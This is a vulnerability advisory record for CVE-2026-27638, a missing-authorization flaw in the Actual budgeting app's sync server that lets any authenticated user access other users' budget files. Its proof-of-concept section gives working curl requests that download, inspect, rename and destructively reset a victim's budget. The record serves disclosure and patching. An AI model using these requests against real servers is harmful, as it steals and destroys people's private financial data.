advisory_id: GHSA-qmjj-p7m9-wjrv
datasource_id: github_osv_importer_v2/GHSA-qmjj-p7m9-wjrv
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-qmjj-p7m9-wjrv/GHSA-qmjj-p7m9-wjrv.json
aliases:
  - CVE-2026-27638
summary: |
  @actual-app/sync-server: Missing authorization in sync endpoints allows cross-user budget file access in multi-user mode
  In multi-user mode (OpenID), the sync API endpoints (`/sync/*`) don't verify that the authenticated user owns or has access to the file being operated on. Any authenticated user can read, modify, and overwrite any other user's budget files by providing their file ID.

  ## Affected Code

  File: `packages/sync-server/src/app-sync.ts`

  The `validateSessionMiddleware` on line 31 confirms the user is authenticated, but individual endpoints only check that the file *exists* (via `verifyFileExists`), never that the requesting user *owns* or *has access to* the file.

  Compare with `POST /sync/delete-user-file` (lines 394-430) which correctly checks:
  ```js
  const isOwner = file.owner === userId;
  const isServerAdmin = isAdmin(userId);
  if (!isOwner && !isServerAdmin) { ... }
  ```

  This check is missing from all other endpoints.

  ## Affected Endpoints

  - `GET /sync/download-user-file` - download any budget file
  - `POST /sync/upload-user-file` - overwrite any budget file
  - `POST /sync/sync` - read/write sync messages of any file
  - `POST /sync/user-get-key` - read encryption key info
  - `POST /sync/user-create-key` - change encryption key
  - `POST /sync/reset-user-file` - reset sync state
  - `POST /sync/update-user-filename` - rename file
  - `GET /sync/get-user-file-info` - read file metadata

  ## PoC

  Setup: Two users (Alice, Bob) authenticated via OpenID on the same Actual server. Alice has a budget with fileId `abc-123`.

  Bob downloads Alice's budget:
  ```bash
  curl -X GET 'https://actual.example.com/sync/download-user-file' \
    -H 'X-Actual-Token: <bob-session-token>' \
    -H 'X-Actual-File-Id: abc-123' \
    -o stolen-budget.blob
  ```

  Bob reads Alice's file metadata:
  ```bash
  curl -X GET 'https://actual.example.com/sync/get-user-file-info' \
    -H 'X-Actual-Token: <bob-session-token>' \
    -H 'X-Actual-File-Id: abc-123'
  ```

  Bob renames Alice's budget:
  ```bash
  curl -X POST 'https://actual.example.com/sync/update-user-filename' \
    -H 'X-Actual-Token: <bob-session-token>' \
    -H 'Content-Type: application/json' \
    -d '{"fileId": "abc-123", "name": "pwned"}'
  ```

  Bob resets Alice's sync state (destructive):
  ```bash
  curl -X POST 'https://actual.example.com/sync/reset-user-file' \
    -H 'X-Actual-Token: <bob-session-token>' \
    -H 'Content-Type: application/json' \
    -d '{"fileId": "abc-123"}'
  ```

  File IDs can be discovered by admin users via `GET /sync/list-user-files` (admins see all files), through `user_access` sharing, or by guessing.

  ## Impact

  In multi-user deployments (OpenID mode), any authenticated user can steal other users' complete financial data (transactions, accounts, balances, payees), modify or destroy their budgets, and tamper with encryption keys. This is a personal finance app, so the data is highly sensitive.
impacted_packages:
  - purl: pkg:npm/%40actual-app/sync-server
    affected_versions: vers:npm/<=26.2.0
    fixed_versions: vers:npm/26.2.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.7'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-qmjj-p7m9-wjrv/GHSA-qmjj-p7m9-wjrv.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-862
references:
  - url: https://github.com/actualbudget/actual
    reference_type:
    reference_id:
  - url: https://github.com/actualbudget/actual/commit/9966c024cb75f57943193cac8e42f401efed9d08
    reference_type:
    reference_id:
  - url: https://github.com/actualbudget/actual/releases/tag/v26.2.1
    reference_type:
    reference_id:
  - url: https://github.com/actualbudget/actual/security/advisories/GHSA-qmjj-p7m9-wjrv
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-27638
    reference_type:
    reference_id: CVE-2026-27638
